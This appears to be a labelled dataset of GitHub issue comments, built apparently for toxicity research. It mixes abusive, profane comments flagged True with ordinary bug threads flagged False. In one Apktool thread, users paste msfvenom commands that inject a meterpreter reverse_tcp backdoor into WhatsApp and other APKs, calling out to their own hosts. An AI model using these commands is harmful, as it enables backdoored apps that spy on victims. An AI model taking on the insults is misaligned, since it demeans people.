windowsserverdocs/MicrosoftDocs/1615/368037517,windowsserverdocs/MicrosoftDocs/1615,"Not only does your on-prem software comes without documentation, and the links you remember to put within the apps aren't even for a direct resource, you still go on to hawking on and on Azure and go on without documenting how stuff is done with the undocumented bloat we pay thousands for.  Document Details ⚠ Do not edit this section. It is required for docs.microsoft.com ➟ GitHub issue linking.  ID 428e9e07-ca35-27d2-e63a-92930cec0118 Version Independent ID 9a452a85-9afa-42d5-f319-bf1c4c50d01d Content Remote Desktop Services architecture Content Source WindowsServerDocs/remote/remote-desktop-services/Desktop-hosting-logical-architecture.md Product windows-server-threshold GitHub Login @friend Microsoft Alias elizapo  ",True,True
zfs/zfsonlinux/7861/418241114,zfs/zfsonlinux/7861,"The question I asked was in regard to the lead developer of this project making a patch for himself to use on a catch22 in feature flags, and therefore not addressed to you.  Nor is it addressed to anyone else that is using a current version of this software, since the relevant patch is over three years old (and now deprecated). What makes you think I'm agreeing with anything you typed?  Don't thank me, I'm not. Thank you, for nothing.  I'd file a bug report about people with pedophile'ish usernames with such high exposure in a project that Canonical seems to care so much about, but your form is (predictably) excessive.  No thanks. For those who might find this on Google, don't bother with that patch/commit.  If your pool got userobj_accounting enabled it is now a Linux-only pool.  You'll have to destroy it, since per the (broken) explanation in the manpage, once active it cannot be decactivated.  Sort of like that Doomsday Machine that Slim Pickens was after.... ",True,True
zfs/zfsonlinux/7960/457992782,zfs/zfsonlinux/7960,"Eh, after reviewing that other issue where someone is calling for a Code of Conduct (which is a fairly dumb idea), I'm surprised to see that you assumed that person was me (perhaps the intention of the troll all along). Since this begs finally some proper attention, I will describe this issue (feel free to remove the comment later as you obviously are seemingly easily to have your feelings hurt regardless of whether the other person intended so or not...). I'll just clarify a few things I've never asked for help in the channel and treated someone ""poorly"". I responded ironically to ptx0's messages, after he spent the past few hours being dismissive or condescending to other people, obviously in some cases users with a very limited skill around ZFS, but that does not merit acting like an imbecile. None of them were insults or hostile, they simply pointed out that ptx0 was assuming things constantly and then replying with an air of arrogance and usually in a condescending tone, despite himself being far from a beacon of excellence as far as technical skill or coding go. Immediately after he proceeded to ban me from the channel, to which I responded in -social pointing out that his attitude and actions making him look puerile and petty regardless of the nature of the ""offense"" by someone else. This knee-jerk reaction came motivated more by petty personal sentiments (and sharing those with some others who, well, fit that profile) than any actually reasonable reasons. Now, on the project you are routinely accepting patches quite obviously without really doing your due diligence, ensuring proper QA, etc. Case in point, the one we have here. It's painful to see that you waste more time on petty nothings over actually making your code or merged patches look like something with a modicum of technical quality. The control over whether contributors are just copy-pasting from other spots (hint licensing violations get people sued), if the patches actually conflict with major kernel features, or symbol exports, or..... is lacking all over the place. How about instead of making up half-truths about people offending your feelings, or your buddies' feelings, you go and properly benefit from the resources you so adamantly defend (and ask others to work with) How difficult was it to grab the patch I sent you from the link, test it, test it again, sign it off and merge it? You need to go around deleting comments and engaging in conversation with the other troll, but you are too busy to actually merge an out of band patch while you waste time over petty fights? Well, good luck with that. And you are surprised ZoL is not taken seriously anywhere but by the homelab/non-enterprise crowd. If you want to be a primadonna, at least have the cards in your sleeve to back it up you can't justify it right now with the standard you are providing your users. And it runs in ring0, so go figure a better way to fend off all those users popping up on IRC asking about destroyed data because you merged a patch from a pull-request that would not stand a moment in the LKML. ",True,True
zfs/zfsonlinux/7960/458004816,zfs/zfsonlinux/7960,"I had no idea who it was. that seems unnecessary. perhaps you were being unintentionally abrasive, as you were in the previous sentence where you imply I have easily hurt feelings. I'm sure you didn't mean to do that, right? then you can see how easily words can be misunderstood. however, more than once have you come and ask for input (maybe not ""help"", exactly) and then were rude to the people who were asking you for more information. criticising how they were attempting to help you. we are volunteers who want to help others. we don't want to deal with difficult people. bans aren't permanent, they can be removed.. sometimes bad things happen in life and we need to respond to them appropriately. people are known to have bad days. coming onto the issue tracker and claiming to withhold your help because of an unrelated incident is not an appropriate response to being banned from an IRC channel. I'd been curious who I'd abused so horribly that day and went back and found this I couldn't find any instances of being condescending or dismissive of any new users, though I did help save someone from redoing hours of work and then warned them about a potential issue. this is a part of a pattern of language from you that we have grown tired of. why do you think it's okay to call others imbeciles? who are you talking about? who is ""they""? I couldn't find this conversation. where did it happen? alright, it may have been a knee-jerk reaction. if you'd messaged me to work it out, things probably would have been Just Fine. interpersonal differences can be worked out, everyone in the project wants the same thing. the ZFS test suite is  very new  and has many deficiencies. testing every possible scenario is, as you must be aware, the impossible task. if you've found problems with the process, raise them specifically as new issues so that they can be addressed. I haven't seen anything until just now, but you don't raise any specific issues or offer any solutions, which seems less than helpful. but a lot of it has simply been spent waiting for a PR to be opened. if you're seeing it happen, why didn't you step up and submit one? is it because of the fact you've pointed out in the past that you consider our contribution process on github to be ""for hipsters"" and something you are essentially too good for? if you have any improvements you see you can make, please do so. otherwise you're just insulting the members of the project, again. any license violations should be raised with the project and fixed. can you cite any specific cases? I don't know what you're talking about. it should be easy to find cases where this is true if it's ""all over the place"". is it too much to ask you to not be rude to people when they give you advice? to not come on here and then insult everyone else's work - people who weren't even involved in your quarrel? for what it's worth, I'm not the one who's responsible for merging patches - there is but one gateway for this project to have patches merged. I can review, test, ask for changes, but that's where it ends. Brian is the one who merges the changes. I have to propose a corollary  to your question. how difficult is it to open a pull request? you mentioned back in early December you were going to open one. I deleted your comment here that only served to insult me and hold your PR hostage. if you don't want to submit the PR, don't - other users can do it when we find the time. it's a cooperative effort. you don't care to be a part of the project in the way we've required, and so your patch doesn't find inclusion. is this surprising to anyone? observation I don't know how long it took you to write your own comment here but it seems like you could have opened a PR in less time. this is another example of your pattern of disrespect. ""You are surprised""? who? not taken seriously? that'd actually be news to... well.. most of us, I imagine. I'm not sure I quite follow. you've seen users reporting data loss with a released build? would that be v0.7.10 that we marked as On Fire shortly after release and that was never included in any distribution? maybe an  related data loss back in 2013 from AIO write path errors? but that was never in a finished release. it might actually be helpful to have a list of data issues that ZFS has had in the past, similar to CVEs. ",True,True
Skript/SkriptLang/1568/425709698,Skript/SkriptLang/1568,thats not cool ,True,True
WarBugs/WarEmu/13182/456842512,WarBugs/WarEmu/13182,"Hey man what's wrong with you? Seriously. A simple no would work fine, you freak. Me and a friend reproduced this bug but forget trying to help you fix anything anymore, loser. ",True,True
addons-frontend/mozilla/7881/432603741,addons-frontend/mozilla/7881,"Yeah, so... the whole Mozilla can go fuck itself. ",True,True
addons-frontend/mozilla/7757/424530262,addons-frontend/mozilla/7757,smartadblock was abusively rejected by erosman (a simple developer) in a case where the reviewer policy clearly states that more info should be requested. The extension has now been offline for 8hours? how has this guy been allowed to review extensions in the first place? ,True,True
editor-layer-index/osmlab/574/433628633,editor-layer-index/osmlab/574,"I feel like you are not even listening to me.  This project doesn't have a version number.  It has a robot that just runs  for people who forget to do it themselves.  The robot introduces conflicts when people actually do run make. It's a ruby script that runs make in a Travis hook to smoosh together JSON files with python.  ELI might just be the hackiest nonsense I've ever seen.  This is not how reliable software is built.  ""Adding more checks"" is missing the point.  Anyone with osmlab rights could just delete all the files.  That we could ""fix it quickly"" is also missing the point.  I'm sure I'd be the person responsible for fixing it quickly. We will never take the autogenerated output on the master development branch of ELI and push it directly into iD.  Never ever.  Stop asking. Let's close this issue, so I can get on with my weekend. ",True,True
bootstrap/twbs/19636/202909411,bootstrap/twbs/19636,"do you want also french fries for that ? -- No, Setting dimension (height) to """" works for me. ",True,True
bootstrap/twbs/19651/205013041,bootstrap/twbs/19651,or you could have answered it here you fucking twat ,True,True
bootstrap/twbs/13476/41935591,bootstrap/twbs/13476,Hi @friend thank you for your ever useless explanations. ,True,True
bootstrap/twbs/1009/3497690,bootstrap/twbs/1009,Shrug. Perhaps @friend  should actually bother looking at the f*cking diff. They were all small changes. ,True,True
bootstrap/twbs/1009/3497701,bootstrap/twbs/1009,"Well, by ""PAYING F*CKING ATTENTION"" you could have specified your pull requests against the branch and allowed for a one-click merge on the website. Close this ""issue"" already and let them get back to real work... ",True,True
mongo-express/mongo-express/411/388622441,mongo-express/mongo-express/411,"Ah... A typical п'явка - you want to tell me what to do with my time, but are not smart enough to fix the problem yourself? Surely you could try, you don't have the looks to be this stupid. ",True,True
zfs/zfsonlinux/8213/449939967,zfs/zfsonlinux/8213,"ZFS is slowly becoming ""the systemd"" of filesystems and it is because of feature requests like this (and #6836, #6041, #4134) Is it too hard to type ""-O compression=lz4"" once in a blue moon? No, it is not. Does your job require typing ""zpool create"" all day long? You can script it with something that fits your needs. Once again we see a great product of engineering being pushed around by the some members of its community. I can't wait to see ZFS/systemd integration via D-Bus /s. ",True,True
openusercss.org/OpenUserCSS/121/400042884,openusercss.org/OpenUserCSS/121,"@friend I want going to reply, bevause I hate dropping to any level of low, but your level of [douchebaggery descrip#3]) has led me to ignore you completely because the level of douche hypocrisy in your reply exceed insanity plus one. ",True,True
Apktool/iBotPeaches/1707/356680980,1707,"Unfortunately apktool seems to be packaged into a 3rd party application here using apktool to pack some payload into an application. The reason for the build failure is not including in this stacktrace so nothing I can do here. Thanks for the report, but not enough details here for me to investigate. ",,False
Apktool/iBotPeaches/1707/356681366,1707,What details do you need? I will provide because I really need to get this fixed ,,False
Apktool/iBotPeaches/1707/287520345,1707,"I am using apktool v 2.3.1. on Kali Linux. I get this error. Yesterday I have tried and it worked, today I get this error with any APK, tried at least 10. "" Using APK template Whatsappo.apk No platform was selected, choosing MsfModulePlatformAndroid from the payload No Arch selected, selecting Arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.whatsapp.zumvr [] Loading /tmp/d20180110-6408-1ej4cd4/original/smali/com/whatsapp/AppShell.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_SMS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CALL_PHONE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [*] Rebuilding Whatsappo.apk with meterpreter injection as /tmp/d20180110-6408-1ej4cd4/output.apk Error Unable to rebuild apk with apktool "" ",,False
Apktool/iBotPeaches/1707/356682563,1707,"I am really sorry, I'm in a hurry. msfvenom -x Whatsappo.apk -p android/meterpreter/reverse_tcp LHOST=MY IPLPORT=6666 -o W.apk Using APK template Whatsappo.apk No platform was selected, choosing MsfModulePlatformAndroid from the payload No Arch selected, selecting Arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.whatsapp.megzx [] Loading /tmp/d20180110-6779-18jmnct/original/smali/com/whatsapp/AppShell.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CALL_PHONE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_SMS""/&gt; [*] Rebuilding Whatsappo.apk with meterpreter injection as /tmp/d20180110-6779-18jmnct/output.apk Error Unable to rebuild apk with apktool root@friend~/Desktop/MSF/Original APKS# ",,False
Apktool/iBotPeaches/1707/356681929,1707,Generally every bit of details that the issue template requests. You removed it and just posted a stacktrace of a 3rd party tool that didn't even expose the stacktrace from Apktool. So generally useless for me. I would report this to whatever tool this is. ,,False
Apktool/iBotPeaches/1707/394502877,1707,really . is there no solution ,,False
Apktool/iBotPeaches/1707/416230209,1707,Error Unable to rebuild apk with apktool ,,False
Apktool/iBotPeaches/1707/422911829,1707,any one have a solution? ,,False
Apktool/iBotPeaches/1707/392445449,1707,"how to fix this error msfvenom -x /root/Desktop/Musixmatch.apk -p android/meterpreter/reverse_tcp LHOST=197.231.43.178 LPORT=6060 -o /root/Desktop/Musixmatchreload.apk Using APK template /root/Desktop/Musixmatch.apk No platform was selected, choosing MsfModulePlatformAndroid from the payload No Arch selected, selecting Arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.musixmatch.android.lyrify.pnriw [] Loading /tmp/d20180528-4429-p0wqf6/original/smali/o/abm.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.ACCESS_FINE_LOCATION""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CALL_PHONE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CHANGE_WIFI_STATE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_CONTACTS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SEND_SMS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.ACCESS_COARSE_LOCATION""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CONTACTS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.RECEIVE_SMS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CAMERA""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_SMS""/&gt; [*] Rebuilding /root/Desktop/Musixmatch.apk with meterpreter injection as /tmp/d20180528-4429-p0wqf6/output.apk Error Unable to rebuild apk with apktool ",,False
Apktool/iBotPeaches/1707/425277216,1707,here you can solve the problem as i answered this question on stackoverflow Link To The Answer On Stack Over Flow ,,False
Apktool/iBotPeaches/1707/429723785,1707,Error Unable to rebuild apk with apktool my apktool is already updated ,,False
Apktool/iBotPeaches/1707/437947892,1707,i have updated the answer on StackOverflow Follow The mentioned link again. ,,False
Apktool/iBotPeaches/1707/437934668,1707,"I too have the same error root@friend~/Downloads# msfvenom -x myidea.apk -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=11560 -o /root/Desktop/myideafreerecharge.apk Using APK template myidea.apk [-] No platform was selected, choosing MsfModulePlatformAndroid from the payload [-] No arch selected, selecting arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.ideacellular.myidea.qwpse [] Loading /tmp/d20181112-9095-1hglxlh/original/smali/com/ideacellular/myidea/MyIdeaApplication.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CONTACTS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.RECORD_AUDIO""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CHANGE_WIFI_STATE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.RECORD_AUDIO""/&gt; [*] Rebuilding myidea.apk with meterpreter injection as /tmp/d20181112-9095-1hglxlh/output.apk Error Unable to rebuild apk with apktool my apktool is updated to latest version 2.3.4 ",,False
Apktool/iBotPeaches/1707/437950577,1707,already tried but not working ,,False
Apktool/iBotPeaches/1707/437953446,1707,"what didn't work ? did u injected manually and rebuilt your apk using ""android studio"" ? ",,False
Apktool/iBotPeaches/1707/437955817,1707,i have updated my apktool by following ur steps  installed zipalign and tried my process as above  still getting the same error ,,False
Apktool/iBotPeaches/1707/437957358,1707,"as i said in ""In The End"" Part , if you still having the rebuilding problem , it's because of apktool that cannot rebuild large apk files, use lower size apk file (&lt;5MB) or use another tool for rebuilding your apk file and inject your Codes or files manually also. ",,False
Apktool/iBotPeaches/1707/437960657,1707,another tools??? ,,False
Apktool/iBotPeaches/1707/437961408,1707,same problem when using 1.3 mb file ,,False
Applied-Energistics-2/AppliedEnergistics/3507/325441833,3507,"  Description EnderIO does not replace all Flour-Items from AppliedEnergistics2. The Pulverizer from ThermalExpansion normally produces AppliedEnergistics2 Flour, but in combination with EnderIO it just produces AppliedEnergistics2 Disabled Item. All other grinders (like SAG-Mill, Grindstone, etc.) produce the EnderIO dustWheat. Environment Steps to reproduce  Install AppliedEnergistics2, ThermalExpansion and EnderIO Place a Pulverizer, power it and put Wheat in it. AppliedEnergistics2 Disabled Item is produced  EnderIO 1.12.2-5.0.21  EnderCore 1.12.2-0.5.18 Minecraft 1.12.2 Forge 14.23.3.2655 AppliedenErgistics2 rv5-stable-11 ThermalExpansion 1.12.2-5.4.2.25-universal  ",,False
Applied-Energistics-2/AppliedEnergistics/3507/392223425,3507,Oh never mind... Going to replace AE2 with Refined Storage and ask everyone with similar problems to do so as well... They at least respond to issue posts... And they don't have this and similar problems... Bye bye AE2 ,,False
Applied-Energistics-2/AppliedEnergistics/3507/392234311,3507,No need to become rude just because you are impatient. The devs are doing it for free and don't owe you shit so you are free to not use ae2 ,,False
Applied-Energistics-2/AppliedEnergistics/3800/372806747,3800,"Whenever i load my world my fps stutters heavily and eventually the game freezes  When the game locks it never starts back up again, Using custom modpack i made in twitch client, in Singleplayer log  Version 1.12.2 AE2 Version rv6-stable-3 Forge Version 14.23.5.2770  ",,False
Applied-Energistics-2/AppliedEnergistics/3800/432731961,3800,"Does this happen always? If so can you try and reduce the amount of mods to a mininum amount possible, or alternative remove just one or 2 until it no longer appears? On the first glance it looks like something tries to use multithreaded worldloading, which is just wrong and we are just the first mod affected by it and crash therefore. ",,False
Applied-Energistics-2/AppliedEnergistics/3800/432777456,3800,Will do this evening ,,False
Applied-Energistics-2/AppliedEnergistics/3800/433599536,3800,"@friend what was your findings, having same problem in my quite random private SP pack ",,False
Applied-Energistics-2/AppliedEnergistics/3800/433609434,3800,i couldnt find the mod causing it. No matter the combonation it seemed to happen at random and only in that world ,,False
Applied-Energistics-2/AppliedEnergistics/3800/451806556,3800,"Encountering this too. I have been trying for some days now on a reproduction method but cannot find the cause as of yet. ♠Time 1/7/19 323 AM Description Exception in server tick loop java.util.ConcurrentModificationException     at java.util.LinkedHashMap$LinkedHashIterator.remove(Unknown Source)     at appeng.me.cache.EnergyGridCache.extractProviderPower(EnergyGridCache.java316)     at appeng.me.cache.EnergyGridCache.extractAEPower(EnergyGridCache.java248)     at appeng.me.cache.EnergyGridCache.onUpdateTick(EnergyGridCache.java199)     at appeng.me.GridCacheWrapper.onUpdateTick(GridCacheWrapper.java43)     at appeng.me.Grid.update(Grid.java280)     at appeng.hooks.TickHandler.onTick(TickHandler.java228)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler_1573_TickHandler_onTick_TickEvent.invoke(.dynamic)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler.invoke(ASMEventHandler.java90)     at net.minecraftforge.fml.common.eventhandler.EventBus.post(EventBus.java677)     at net.minecraftforge.fml.common.eventhandler.EventBus.post(EventBus.java634)     at net.minecraftforge.fml.common.FMLCommonHandler.onPostServerTick(FMLCommonHandler.java266)     at net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java712)     at net.minecraft.server.MinecraftServer.run(MinecraftServer.java526)     at java.lang.Thread.run(Unknown Source) A detailed walkthrough of the error, its code path and all known details is as follows -- Head -- Thread Server thread Stacktrace     at java.util.LinkedHashMap$LinkedHashIterator.remove(Unknown Source)     at appeng.me.cache.EnergyGridCache.extractProviderPower(EnergyGridCache.java316)     at appeng.me.cache.EnergyGridCache.extractAEPower(EnergyGridCache.java248)     at appeng.me.cache.EnergyGridCache.onUpdateTick(EnergyGridCache.java199)     at appeng.me.GridCacheWrapper.onUpdateTick(GridCacheWrapper.java43)     at appeng.me.Grid.update(Grid.java280)     at appeng.hooks.TickHandler.onTick(TickHandler.java228)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler_1573_TickHandler_onTick_TickEvent.invoke(.dynamic)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler.invoke(ASMEventHandler.java90)     at net.minecraftforge.fml.common.eventhandler.EventBus.post(EventBus.java677) -- Sponge PhaseTracker -- Details     Phase Stack [Empty stack] Stacktrace     at net.minecraft.server.MinecraftServer.handler$onCrashReport$zjk000(MinecraftServer.java3980)     at net.minecraft.server.MinecraftServer.func_71230_b(MinecraftServer.java889)     at net.minecraft.server.dedicated.DedicatedServer.func_71230_b(DedicatedServer.java371)     at net.minecraft.server.MinecraftServer.run(MinecraftServer.java558)     at java.lang.Thread.run(Unknown Source) ",,False
Applied-Energistics-2/AppliedEnergistics/3800/451859209,3800,"can you possibly test without sponge? other than that, this MAY be an power issue, try to add some dense enrgy cells to your network, it is possible that your system has too low capacity and stall during startup in an infinite loop ... and maybe sponge with some tick shenanigangs grinds it to a halt ",,False
Applied-Energistics-2/AppliedEnergistics/3800/451964967,3800,OP wasn't using Sponge. Sponge has nothing to do with this error. ,,False
Applied-Energistics-2/AppliedEnergistics/3800/451980062,3800,"Was i referring to op?  I quoted your log and the advice was meant in general, how about being constructive and check for what i wrote? ",,False
Applied-Energistics-2/AppliedEnergistics/3800/451983655,3800,"Original poster. If you check his crash report, he's not using Sponge. It's just a bias towards Sponge and if someone is gonna to push bias in-front of me I'm going to slap you down. Stop it. ",,False
Applied-Energistics-2/AppliedEnergistics/3800/452023398,3800,So in that case perhaps help us out a little. You did not post your whole log so we can not see what mods you have so we cannot look for mods you may have in common with the OP. ,,False
Applied-Energistics-2/AppliedEnergistics/3800/452027664,3800,"3812, #3831 Plenty of crash reports to build enough correlation. I don't understand the Sponge hate and it's completely unnecessary and off-topic. Suddenly people care about this because ""Sponge"". Really interesting. ",,False
Applied-Energistics-2/AppliedEnergistics/3800/452031156,3800,"Asking to try it without sponge is perfectly fine. It could easily be caused by some changes to chunkloading or similar system, which sponge likes to do and some other mod might simply include similar changes because they claimed it should be 5% faster but crashes in return. It would simply remove some variables and could make it easier. Or at least rule it out as possible cause. But it appears you are not actually interested in identifying a potential cause as well as reject a simple and quick request. So I do not see any chance to get something useful out of it from discussing it any further. ",,False
BEE2.4/BEEmod/937/333006808,937,"This is a problem that many people have. It's a puzzle not building with prerelease 28 or 29. I never copied the output, but let's just say that it could even be blank and it will still fail. I'm trying right now to make a map that involves wall climbing. If you don't know what wall climbing is, you put a cube down to the corner of 2 walls, and put something ontop of it that's small, like a camera. I will try pre release 27 for this, and if it does have this issue, this needs to be fixed in prerelease 30 unless you can give me a fix. ",,False
BEE2.4/BEEmod/937/398653725,937,"When using BEE2.4 after installing a new version, old resources from past releases will not be overwritten, resulting in bugs that were fixed still being present and some things not working correctly. Your issue clearly seems te be related to this, so in order to solving this annoyance, you will have to do the following 1 - Open Beemod and click on . 2 - Wait 1 minute while Beemod removes their resources from Portal 2. 3 - Verify the Game Cache Files. 4 - Make sure to have downloaded and unzipped the latest Item's Packages and Application version of BEE2.4, and both must be from the same Pre-Release Version, otherwise bugs may occur. Links  (Application)   (Item's Packages) Note that if you are running Beemod on Linux or Mac Os X, or even on 32 Bit versions of Windows, issues can occur. Beemod currently works well only on 64 Bit versions of Windows 7, 8 and 10. 5 - Click on , then uncheck the option . 6 - Now choose your favorite Items &amp; Style and export your palette to the game. 7 - Make sure to save these steps in a text file in case you get similar issues in the future. 8 - Happy mapmaking! ",,False
BEE2.4/BEEmod/937/398717271,937,Why close it? It’s possible that it won’t work. ,,False
BEE2.4/BEEmod/937/399207879,937,"This still didn't fix it, so who's the noob now? Give me the actual fix, you bitch. ",,False
BEE2.4/BEEmod/937/399208861,937,Woah that came out of nowhere Icy. Calm yourself Lautaro's ways has worked for me and if its not working for you. You probably did something wrong. Or your items are placed in ways that break the map. Check the placement of items and their orientations. Make sure no items are behind/below partial blocks. etc. ,,False
BEE2.4/BEEmod/937/399210524,937,"it all checks out, I did all of the stuff he said, nothing works... But this error message came through. Get your ass ready though, it's quite long. compile errors.txt ",,False
BEE2.4/BEEmod/937/399212366,937,That seems to be your issue but I dont know how to fix that. Ask Lautaro or someone ,,False
BEE2.4/BEEmod/937/399270503,937,@friend Please no swearing there is no need for it. ,,False
BEE2.4/BEEmod/937/399380043,937,Lol it is pretty fun for me to see when noobs gets mad so easily. ,,False
BEE2.4/BEEmod/937/399473737,937,"Uhmm... How about no? I am not the author of Beemod, the author is @friend, which is the one who works on the compiler thing. I am just a collaborator. PrayForNoobs ",,False
BEE2.4/BEEmod/937/399548155,937,"well I need a fix, I even had to have my friend fucking publish one of my levels for me, I don't want everything I make to be my friend's shit anymore. ",,False
BEE2.4/BEEmod/937/399608627,937,@friend Please stop with the swearing there is no need for it. ,,False
BEE2.4/BEEmod/937/399609102,937,"In light of the Bee2 Contributing Guidelines, this issue is getting locked due to excessive fowl language and toxicity. Please do not repeat this behavior in future issues. ",,False
BEE2.4/BEEmod/937/399609203,937,@friend Good thinking. ,,False
Croppie/Foliotek/587/380720280,587,"I've spent 3 DAYS configuring this plugin to work nicely in a Bootstrap modal and the final result looks UGLY. It turned out that the plugin has numerous issues. In other cases, I'd fill detailed bug reports, but now I feel so desperate... I don't see any sense in posting issues that will duplicate existing ones. If you're reading this while choosing a JS plugin for image cropping, DO NOT USE CROPPIE!!! Go look for any better alternatives. The most important issues that I encountered  when input image is of type JPG and I try to get result (of type PNG by default), it produces a blank image. when  and  and image is zoomed in, it's possible to drag viewport bounds outside of the container bounds. it results in hidden viewport bounds and an overzoomed image; it's impossible for user to fix this, user is forced to refresh the whole page. when  it's impossible to make aspect ratio fixed.  Expected Behavior it works. Actual Behavior it doesn't.  Browser Chrome 71 Plugin version 2.6.2  ",,False
Croppie/Foliotek/587/438710257,587,"Sorry you experienced issues with croppie.  I'll be the first to admit that I don't have as much time as I'd like to support this anymore. That being said, plenty of people use croppie with the bootstrap modals  you don't want to use Croppie, that's fine.  I honestly don't care.  But to post an insulting issue in an open source project that I (and several other people) have spent a lot of time building, and have been gracious enough to share with the community  .... is rude. Next time try just asking for help before you lose your temper. ",,False
ImageSharp/SixLabors/485/303910639,485,"Prerequisites  [ ] I have written a descriptive issue title [ ] I have verified that I am running the latest version of ImageSharp [ ] I have verified if the problem exist in both  and  mode [ ] I have searched open and closed issues to ensure it has not already been reported  Description   Steps to Reproduce   System Configuration    ImageSharp version Other ImageSharp packages and versions Environment (Operating system, version and so on) .NET Framework version Additional information  ",,False
ImageSharp/SixLabors/485/371893483,485,please direct questions to our gitter channel as it says in our readme ,,False
ImageSharp/SixLabors/485/371902764,485,"Thank you,  Scott, for the answer so quick.  I am very new to using this channel. Please accept my excuse.) So the question for me was .. when I save the image, the size of a saved image is not the correct size. I think this problem probably comes from my OS(Windows 10).  I wanted to know if is there another way to save the image in your library. Thank you very much. ",,False
ImageSharp/SixLabors/485/371909184,485,"This problem I have faced before. When I tried to save image as an object directly, no matter bitmap or image object in windows forms by c#, I had the problem.  The size of the saved image was always wrong. I do not remember but I think I have solved by using file stream class.. It may give a clue. I will try to find a way base on this experience.  Not sure If I can. ",,False
ImageSharp/SixLabors/485/371916534,485,"@friend can you be more specific? We hardly understand your issue.  When getting incorrect results Are you trying to resize + save your image with ? Or are you trying ImageSharp? (We do not depend on OS services at all btw.) If you are looking for basic ImageSharp resize examples, just go through our main README. ",,False
ImageSharp/SixLabors/485/371918622,485,"If your issue is ImageSharp specific, and you are getting results different from what you expect Can you please share a basic sample code snippet/console application reproducing your issue with your sample image attached? ",,False
ImageSharp/SixLabors/485/371927184,485,"The image uploaded is 4.30 MB .the Image saved by the code below is always as less than 1 MB.                 using (var memoryStream = new MemoryStream())                 {                     fl.CopyTo(memoryStream);                     using (Image&lt;Rgba32&gt; image = Image.Load&lt;Rgba32&gt;(memoryStream.ToArray()))                     {                          //with encoder it changes but still wrong                         //without encoder it allways wrong size for saved image                         IImageEncoder imageEncoder = new JpegEncoder()                         {                             Quality = 90,                             Subsample = JpegSubsample.Ratio444                         };                           image.Mutate(x =&gt;                         {                             x.AutoOrient();                             //x.Resize(image.Width / 2, image.Height / 2);                             image.Save&lt;Rgba32&gt;(fileSaveUrl, imageEncoder);                             x.Grayscale();                             image.Save(fileSaveGrayUrl, imageEncoder);                             x.BlackWhite();                             image.Save&lt;Rgba32&gt;(fileSaveBWUrl, imageEncoder);                             x.Lomograph(new SixLabors.Primitives.Rectangle(5, 5, 300, 400));                             image.Save&lt;Rgba32&gt;(fileSaveLMUrl, imageEncoder);                         });                       }                 }  ",,False
ImageSharp/SixLabors/485/371933035,485,"So you mean file size. It wasn't clear from your original post, ""image size"" usually means image dimensions. By applying filters like blackwite or grayscale, you are loosing information, and jpeg is a compressed format, so it works as expected. Do you also get a 4x smaller file size after applying AutoOrient (without doing a resize)? Can you share a sample image reproducing the issue? Can you also explain why is this an issue in your application? Is the image quality insufficient? ",,False
ImageSharp/SixLabors/485/371933945,485,"on min, please I am installing visual studio preview.  Later on, I will send you both the source image and the output image. ",,False
ImageSharp/SixLabors/485/371935503,485,"You seem to keep describing what your seeing not what the problem is.. basically we need to know why a 1mb file is wrong. As far as I can see you are taking an image, resizing it so that it 4 times less the number of pixels and are confused about the fact you are getting an image out that's 4 times smaller, personally that's an outcome I would be hoping for. ",,False
ImageSharp/SixLabors/485/371937732,485,"I guess you need to deal with it. As I have mentioned before. When somehow an image is resized by c# in windows machine I mean visual studio and when we did a save this resized Image directly, Like img.Save(....) , this problems comes out. So it was a long time ago, as I remember, my solution was, to read and write with byte arrays using filestream objects. So my opinion, the problem is not coming from your code but you need to handle this problem. I will share with you the details. ",,False
